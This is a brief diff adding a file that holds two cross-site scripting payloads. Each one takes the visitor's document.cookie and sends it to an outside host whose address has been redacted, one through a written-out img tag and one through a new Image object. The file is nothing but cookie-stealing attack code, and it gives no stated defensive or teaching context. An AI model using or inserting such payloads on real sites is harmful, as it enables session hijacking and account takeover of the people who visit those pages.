@@ -1,0 +1,7 @@
+<script>
+document.write('<img src="[URI]?c='+document.cookie+'" />');
+</script>
+
+<script>
+new Image().src="[URI]?c="+document.cookie;
+</script>
